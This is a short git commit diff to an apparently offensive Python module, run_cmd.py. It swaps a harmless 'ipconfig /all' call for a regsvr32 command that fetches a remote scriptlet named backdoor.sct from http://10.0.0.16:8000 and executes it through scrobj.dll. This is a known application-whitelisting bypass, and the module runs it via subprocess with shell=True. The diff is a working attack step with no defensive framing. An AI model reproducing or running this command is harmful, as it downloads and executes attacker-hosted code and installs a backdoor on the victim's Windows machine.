b11435ecc20261035abac2d09d16a4c1784c41dd
MFtesting <testing@carnal0wnage.com>
2017-04-08 10:31:17 -0400

    Update run_cmd.py

--- modules/run_cmd.py
+++ modules/run_cmd.py
@@ -2,7 +2,8 @@ import os
 import subprocess
 
 def run(**args):
-    cmd = "ipconfig /all"
+    #cmd = "ipconfig /all"
+    cmd = "cmd /c regsvr32 /s /n /u /i:http://10.0.0.16:8000/backdoor.sct scrobj.dll"
     print "[*] In run command module."
     # issue the shell command we want
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
